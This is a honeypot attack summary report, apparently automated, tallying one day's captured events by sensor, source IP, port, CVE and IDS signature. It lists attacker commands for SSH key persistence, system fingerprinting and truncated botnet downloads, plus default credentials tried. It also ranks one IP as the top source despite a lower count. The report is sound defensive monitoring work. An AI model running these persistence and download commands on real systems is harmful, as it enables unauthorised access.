Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-09T14:01:27Z
**Timeframe:** 2025-10-09T13:20:02Z to 2025-10-09T14:00:01Z
**Files Used:**
- agg_log_20251009T132002Z.json
- agg_log_20251009T134001Z.json
- agg_log_20251009T140001Z.json

### Executive Summary

This report summarizes 23,138 events collected from our honeypot network. The majority of attacks were captured by the Cowrie, Suricata, and Heralding honeypots. A significant number of attacks originated from the IP address `188.253.1.20`. The most frequently targeted port was `vnc/5900`, indicating a high volume of VNC-related scans and attacks. Attackers attempted to exploit several vulnerabilities, with `CVE-2002-0013` and `CVE-2002-0012` being the most common. A variety of commands were executed, primarily focused on reconnaissance and establishing persistence.

### Detailed Analysis

**Attacks by Honeypot:**
- Cowrie: 9389
- Suricata: 5518
- Heralding: 2758
- Honeytrap: 2581
- Ciscoasa: 1588
- Sentrypeer: 930
- Tanner: 66
- Dionaea: 68
- Adbhoney: 46
- Mailoney: 50
- ConPot: 24
- Miniprint: 32
- Redishoneypot: 37
- H0neytr4p: 23
- Honeyaml: 9
- ElasticPot: 6
- Dicompot: 12
- Ipphoney: 1

**Top Attacking IPs:**
- 188.253.1.20: 2454
- 167.250.224.25: 2916
- 124.40.250.105: 1647
- 10.17.0.5: 946
- 129.212.183.36: 992
- 10.140.0.3: 559
- 80.94.95.238: 664
- 78.31.71.38: 500
- 192.3.105.24: 317
- 190.72.106.126: 307

**Top Targeted Ports/Protocols:**
- vnc/5900: 2755
- TCP/445: 1700
- 22: 1475
- 5060: 930
- 5903: 196
- 8333: 142
- TCP/22: 111
- 23: 29
- 80: 69
- 6379: 28
- 25: 50
- 9443: 41
- 9100: 32
- UDP/161: 39
- UDP/5060: 53

**Most Common CVEs:**
- CVE-2002-0013 CVE-2002-0012: 24
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 18
- CVE-2024-4577 CVE-2002-0953: 2
- CVE-2024-4577 CVE-2024-4577: 2
- CVE-2020-2551 CVE-2020-2551 CVE-2020-2551: 2
- CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773: 1
- CVE-2021-42013 CVE-2021-42013: 1
- CVE-2019-11500 CVE-2019-11500: 1
- CVE-1999-0517: 1
- CVE-2001-0414: 1

**Commands Attempted by Attackers:**
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password:
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- tftp; wget; /bin/busybox PHSLC
- cd /data/local/tmp/; rm *; busybox wget ...
- chmod 0755 /data/local/tmp/nohup
- chmod 0755 /data/local/tmp/trinity
- cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget ...
- echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN Potential SSH Scan
- ET INFO VNC Authentication Failure
- ET HUNTING RDP Authentication Bypass Attempt
- ET INFO Reserved Internal IP Traffic
- ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source)
- GPL SNMP request udp
- ET DROP Spamhaus DROP Listed Traffic Inbound group 28
- ET VOIP Possible Inbound VOIP Scan/Misuse With User-Agent Zoiper
- ET VOIP Modified Sipvicious Asterisk PBX User-Agent
- ET INFO CURL User Agent
- ET SCAN Suspicious inbound to PostgreSQL port 5432

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- support/support77
- root/PBX...
- rohit/rohit123
- default/maintenance
- postgres/postgres
- root/Aa123456
- root/Pa$$word@...
- supervisor/uploader
- guest/qwerty123
- /Passw0rd
- supervisor/555555
- support/qwertyuiop
- root/Root!...
- unknown/unknown44

**Files Uploaded/Downloaded:**
- sh
- 11
- fonts.gstatic.com
- css?family=Libre+Franklin...
- ie8.css?ver=1.0
- html5.js?ver=3.7.3
- svg
- xlink
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- sex.sh
- )

**HTTP User-Agents:**
- No user-agent data was collected during this period.

**SSH Clients and Servers:**
- No SSH client or server data was collected during this period.

**Top Attacker AS Organizations:**
- No attacker AS organization data was collected during this period.

### Key Observations and Anomalies

- The high number of events targeting `vnc/5900` suggests a coordinated campaign or a widespread automated scanner looking for exposed VNC servers.
- A significant number of commands are related to establishing a persistent SSH connection via `authorized_keys`, indicating a common post-exploitation technique.
- Attackers frequently use commands to gather system information (`uname`, `lscpu`, `/proc/cpuinfo`), likely for fingerprinting the environment before deploying further payloads.
- The presence of download commands for various architectures (`arm`, `x86`, `mips`) suggests the use of multi-architecture malware, possibly related to IoT botnets.
- The `DoublePulsar Backdoor` signature was triggered a large number of times, pointing to attempts to exploit the EternalBlue vulnerability (MS17-010).

This concludes the Honeypot Attack Summary Report. Further analysis of the captured payloads and attacker TTPs is recommended.
